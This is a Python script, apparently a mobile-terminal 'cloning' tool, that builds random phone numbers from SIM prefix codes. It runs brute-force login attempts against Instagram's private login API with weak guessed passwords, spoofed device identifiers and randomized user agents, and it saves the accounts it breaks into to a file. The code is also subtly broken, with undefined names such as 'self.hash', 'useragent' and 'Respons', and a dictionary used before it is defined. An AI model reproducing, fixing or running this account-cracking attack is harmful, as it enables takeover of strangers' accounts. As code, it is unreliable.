###-------[IMPORT MODULES]-----------####
 
import os
import sys
import time
import uuid
import json
import string
import random
import requests
from requests.exceptions import ConnectionError
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime 
from bs4 import BeautifulSoup
import re, os, uuid, sys, requests, datetime, hashlib, urllib, pytz, zlib, time, json, random, base64, string
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as bsp
from rich import print as Print
from rich.panel import Panel as Nel
from rich.console import Console
from rich.tree import Tree
###-------[BASIC COLORS]-----------####
reset = "\033[0m"
red = "\033[1;31m"
green = "\033[1;32m"
yellow = "\033[1;33m"
blue = "\033[1;34m"
cyan = "\033[1;36m"
white = "\033[1;37m"
 
###-------[FLASH COLORS]-----------####
colors = ["\033[1;30m", "\033[1;30m", "\033[0;31m", "\033[1;31m", "\033[0;32m", "\033[1;32m","\033[0;92m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[0;33m", "\033[1;33m", "\033[0;34m", "\033[1;34m", "\033[0;35m", "\033[1;35m", "\033[0;36m", "\033[1;36m", "\033[0;37m", "\033[1;37m", "\033[1;90m", "\033[0;91m","\033[1;91m", "\033[0;92m", "\033[1;93m", "\033[0;94m", "\033[1;94m", "\033[0;95m","\033[1;95m", "\033[0;96m", "\033[1;96m", "\033[0;97m", "\033[0;100m", "\033[1;100m","\033[0;101m", "\033[1;101m", "\033[0;102m", "\033[1;102m","\033[0;104m", "\033[1;104m", "\033[0;105m", "\033[1;105m", "\033[0;106m", "\033[1;106m"]
 
###-------[LOOP]-----------####
loop = 0
idz = []
oks = []
cps = []
id, Loop, MethodType, ResultSuccess, ResultChechpoint,UbahData,info,proxi, \
NazriDev, MID, PROXY, CrackDuplikat, bugbaru = [], 0, [], 0, 0, [], {}, [], {}, [], {'Update':None,'proxi':[]}, [], []

sys.stdout.write('\x1b[1;35m\x1b]2;🌹🌻🍂💛instagram 🙂💗 \x07')
 
try:os.mkdir('/sdcard/XYZ')
except:pass
 
 
###-------[LOGO]-----------####
logo= f'''\033[1;97m---------------------------------------------------
 \033[1;97m[\033[1;92m•\033[1;97m] Author   : sumon roy
\033[1;97m---------------------------------------------------'''
 
 
###-------[CLEAR TERMINAL]-----------####
def clear():
    os.system("clear")
    print(logo)
 
 
 
###-------[LINE]-----------####
def linex():
    print(f"\033[1;97m--------------------------------------------------")
 
 
 
###-------[MSIN MENU]-----------####
def menu():
    clear()
    print(f" \033[1;97m[\033[1;92m01\033[1;97m] RANDOM NUMBER CLONING")
    print(f" \033[1;97m[\033[1;92m02\033[1;97m] \033[1;32mCONTACT' DEVELOPER")
    linex()
    younisxyz = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option : ")
    if younisxyz in ['1','01']:
        random_number()
    elif younisxyz in ['2','02']:
        os.system("xdg-open ")
        time.sleep(3)
        menu()
    else:
        print(f"\n\033[1;91m Select valid option ....")
        time.sleep(3)
        menu()
 
 
###-------[DEF CLONING]-----------####
def random_number():
    clear()
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Codes : \033[1;92m0310, 0320, 0330, 0340 ")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Limit : \033[1;92m1000, 2000, 5000, 10000 ")
    linex()
    code = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Code  :\033[1;92m ")
    try:
        limit = int(input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Limit :\033[1;92m "))
    except ValueError:
        limit = 5000
    for _ in range(limit):
        x = "".join(random.choice(string.digits) for _ in range(6))
        idz.append(x)
    with ThreadPoolExecutor(max_workers=30) as XYZ:
        clear()
        total_idz = str(len(idz))
        print(f"\033[1;96m KING IS ALWAYS KING")
        print(f"\033[1;96m SOME RESPECT")
        linex()
        print(f' \033[1;32m(√) \033[1;37mTotal IDs  :\033[1;32m ',total_idz)
        print(' \033[1;37m{\033[1;32m+\033[1;37m} \033[1;35mCHOICE SIM CODE : \033[1;32m'+code)
        print(" \x1b[38;5;208m(!) \x1b[38;5;205mUse Flight Mode For Speed UP");print(' \033[1;33m[•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/XYZ')
        linex()
        for xyz in idz:
            uid = code+xyz
            pww = ['57273200',uid[:6],uid[:8],uid] 
         #,uid[:6],uid[:8],uid,uid[2:],uid[4:]
            XYZ.submit(crack, uid, pww, total_idz)
    linex()
    print(f" \033[1;97m[\033[1;92m!\033[1;97m] Process Completed ")
    print(f" \033[1;97m[\033[1;92m•\033[1;97] Total Ok Accounts : \033[1;92m{str(len(oks))} ")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Total Cp Accounts : \033[1;91m{str(len(cps))} ")
    linex()
    input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter To Back ")
    menu()
 
#-> Custom Android ID
def Android_ID(uid, pww):
       xyz = hashlib.md5()
       xyz.update(uid.encode('utf-8') + pww.encode('utf-8'))
       hex = xyz.hexdigest()
       xyz.update(hex.encode('utf-8') + '12345'.encode('utf-8'))
       return xyz

def AppUac(GoblokLu=None):
	    brand = random.choice(list(devices.keys()))  # Pilih merek acak
	    model = random.choice(devices[brand])  # Pilih model acak
	    android_version = random.randint(24, 34)  # Android versi 7.0 - 14
	    dpi = random.choice([320, 400, 480, 560])  # DPI acak
	    width = random.randint(720, 1440)  # Resolusi lebar
	    height = random.randint(1280, 3120)  # Resolusi tinggi
	    lang = random.choice(["en_US", "fr_FR", "id_ID", "es_ES"])  # Bahasa acak
	    version_code = random.randint(300000000, 400000000)  # Kode versi acak
	    devices = {
	    "Realme": ["RMX2020", "RMX2195", "RMX3085"],
	    "Vivo": ["V2026", "V2140", "V2111"],
	    "Poco": ["Poco X3 Pro", "Poco F3", "Poco M4 Pro"],
	    "Samsung": ["SM-A127F", "SM-M215F", "SM-G991B"],
	    "Infinix": ["Infinix X690B", "Infinix X680", "Infinix X671"],
	    "Asus": ["ASUS_I005DA", "ASUS_Z01RD", "ASUS_X00TD"],
	    "iPhone": ["iPhone12,1", "iPhone13,2", "iPhone14,5"],
	    "Redmi": ["Redmi Note 9", "Redmi Note 10", "Redmi 11 Pro"]}
	    # Format User-Agent dengan f-string
	    user_agent = f"Instagram {version_code}.0.0.{random.randint(10, 40)}.{random.randint(100, 500)} Android ({android_version}/{random.randint(10, 15)}; {dpi}dpi; {width}x{height}; {brand}/{brand}; {model}; {model}; mt6768; {lang}; {random.randint(500000000, 900000000)})"
	    
	    return user_agent
       

def timezone_offset():
       tim = datetime.datetime.now(pytz.timezone('Asia/Jakarta'))
       ofs = tim.utcoffset().total_seconds()/60/60
       return ofs

def generate_x_mid():
    prefix = "MID"  # Instagram uses MID prefix
    chars = string.ascii_letters + string.digits + "-_"
    body = "".join(random.choice(chars) for _ in range(22))  # 22 chars = typical MID length
    return prefix + body

def Blok_ID():
       v23 = '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73'
       v39 = 'c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49'
       v09 = '9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a'
       v07 = '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73'
       return(random.choice([v09,v39,v23,v07]))

   # pkg install iproute2
def UseNet():
       #net = []
       #for y in os.popen('ip neigh show'):net.append(y)
       #if 'wlan' in str(net) or 'wlan0' in str(net):return('WIFI','WIFI')
       #else:return('MOBILE.LTE','MOBILE(LTE)')
       return('MOBILE.LTE','MOBILE(LTE)')

def HeadersApiLogin():
       return {
          'host': 'b.i.instagram.com',
          'x-ig-app-locale': 'in_ID',
          'x-ig-device-locale': 'in_ID',
          'x-ig-mapped-locale': 'id_ID',
          'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-3',
          'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
          'x-ig-bandwidth-speed-kbps': '-1.000',
          'x-ig-bandwidth-totalbytes-b': '0',
          'x-ig-bandwidth-totaltime-ms': '0',
          'x-bloks-version-id': Blok_ID(),
          'x-bloks-is-prism-enabled': 'false',
          'x-bloks-is-layout-rtl': 'false',
          'x-ig-device-id': 'eac0665e-1663-4d65-9ddb-ef6ec5d6cbeb',
          'x-ig-family-device-id': '8f158cce-a537-408f-acb2-21d5798b8515',
          'x-ig-android-id': 'android-4aca695260085376',
          'x-ig-timezone-offset': str(timezone_offset()),
          'x-fb-connection-type': 'MOBILE.LTE',
          'x-ig-connection-type': 'MOBILE(LTE)',
          'x-ig-capabilities': '3brTv10=',
          'x-ig-app-id': '3419628305025917',
          'priority': 'u=3',
          'user-agent': 'Instagram 312.1.0.34.111 Android (30/11; 320dpi; 720x1472; INFINIX MOBILITY LIMITED/Infinix; Infinix X688B; Infinix-X688B; mt6765; en_US; 548323754)',
          'accept-language': 'id-ID, en-US',
          'x-mid': str(SetMid()),
          'ig-intended-user-id': '0',
          'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'content-length': '3146',
          'x-fb-http-engine': 'Liger',
          'x-fb-client-ip': 'True',
          'x-fb-server-cluster': 'True'
       }

###-------[METHOD CRACK]-----------####
def crack(uid, pww, total_idz):
    global loop
    global oks
    global cps
    x = random.choice(["\033[1;90m","\033[1;91m","\033[1;92m" ,"\x1b[38;5;208m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m"])
    sys.stdout.write(f"\r{x}[BITHIKA] {loop}/{total_idz} \033[1;92m{len(oks)}\033[1;97m/\033[1;91m{len(cps)} \033[1;97m[\033[1;93m{'{:.0%}'.format(loop/float(total_idz))}\033[1;97m] ")
    sys.stdout.flush()
    try:
        for pw in pww:
            byps = requests.Session()
            headers = {
                    'host': 'i.instagram.com',
                    'x-ig-app-locale': 'in_ID',
                    'x-ig-device-locale': 'in_ID',
                    'x-ig-mapped-locale': 'id_ID',
                    'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-3',
                    'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
                    'x-bloks-version-id': 'c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49',
                    'x-ig-www-claim': '0',
                    'x-bloks-is-prism-enabled': 'false',
                    'x-bloks-is-layout-rtl': 'false',
                    'x-ig-device-id': str(uuid.uuid4()),
                    'x-ig-family-device-id': str(uuid.uuid4()),
                    'x-ig-android-id': f'android-{self.hash.hexdigest()[:16]}',
                    'x-fb-connection-type': 'MOBILE.LTE',
                    'x-ig-connection-type': 'MOBILE(LTE)',
                    'x-ig-capabilities': '3brTv10=',
                    'priority': 'u=3',
                    'user-agent': useragent,
                    'accept-language': 'id-ID, en-US',
                    'x-mid': '',
                    'ig-intended-user-id': '0',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'x-fb-http-engine': 'Liger',
                    'x-fb-client-ip': 'True',
                    'x-fb-server-cluster': 'True',
                    'x-ig-bandwidth-speed-kbps': str(random.randint(100,300)),
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(500000,900000)),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(1000,9000)),
                    'x-ig-app-id': '3419628305025917',
                    'x-pigeon-rawclienttime': str(round(time.time(), 3)),
                    'connection': 'keep-alive'
                }
            encode = (f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{self.hash.hexdigest()[:16]}%22%2C%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22%22%2C%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(time.time)[:10]}%3A{urllib.request.quote(str(pw))}%22%2C%22family_device_id%22%3A%22{str(uuid.uuid4())}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A3%2C%22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22{urllib.request.quote(str(uid))}%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22username_text_input_id%22%3A%22p5hbnc%3A46%22%2C%22device_id%22%3A%22android-{self.hash.hexdigest()[:16]}%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%22{str(uuid.uuid4())}%22%2C%22login_source%22%3A%22Login%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A152086072800150%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_platform_login%22%3A0%2C%22is_caa_perf_enabled%22%3A0%2C%22credential_type%22%3A%22password%22%2C%22family_device_id%22%3A%22{{str(uuid.uuid4())}}%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22password_text_input_id%22%3A%22p5hbnc%3A47%22%2C%22ar_event_source%22%3A%22login_home_page%22%7D%7D&\bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49')
            headers.update({'content-length': str(len(encode)), 'cookie': (";").join([ "%s=%s" % (key, value) for key, value in byps.cookies.get_dict().items() ])})
            response = byps.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data = encode, headers = headers, allow_redirects=True).text
            print("STATUS:", Respons.status_code)
            print("RESPONSE:", Respons.text)
            if 'logged_in_user' in Respons.text.replace('\\',''):
                print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
                open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}\n")
                oks.append(uid)
                return True
            else:
                continue
        loop+=1
    except ConnectionError:
        time.sleep(10)
    except:
        pass
menu()
 
